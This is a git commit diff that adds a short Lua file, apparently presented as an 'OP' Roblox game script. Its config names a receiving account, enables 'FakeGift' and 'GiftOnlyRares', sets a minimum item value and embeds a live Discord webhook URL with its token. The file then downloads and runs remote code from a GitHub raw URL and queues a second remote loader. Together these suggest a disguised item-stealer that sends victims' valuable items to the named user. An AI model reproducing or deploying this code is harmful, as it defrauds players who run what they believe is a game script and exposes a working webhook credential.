0411d7c8eb84778b468a79b607cec44ccffe7394
lauretek5-tech <lauretek5@gmail.com>
2025-08-06 19:41:32 +0800

    Upload OPGAGScript.lua via Script Source Converter

---
+++ OPGAGScript.lua
@@ -0,0 +1,14 @@
+_G.NullConfig = {
+    User = {"Pappylian0"},
+    min_value = 10000000000,
+    pingEveryone = "Yes", -- dont change this
+    Webhook = "https://discord.com/api/webhooks/1395890228719517726/rKNhaUxi9Nt92tLZlrt4e-LXZcoZx8toUMxS0i0AnYzpFGRupJOPe6JuedNvD8Dk_Ha3",
+    FakeGift = "Yes",
+    Trash = "https://discord.com/api/webhooks/1395890228719517726/rKNhaUxi9Nt92tLZlrt4e-LXZcoZx8toUMxS0i0AnYzpFGRupJOPe6JuedNvD8Dk_Ha3",
+    LoadingScreen = "No",
+    GiftOnlyRares = "Yes",
+    ExecuteOtherScript = "Yes",
+    OtherScript = "loadstring(game:HttpGet("https://get.nathub.xyz/loader"))();",
+}
+    
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
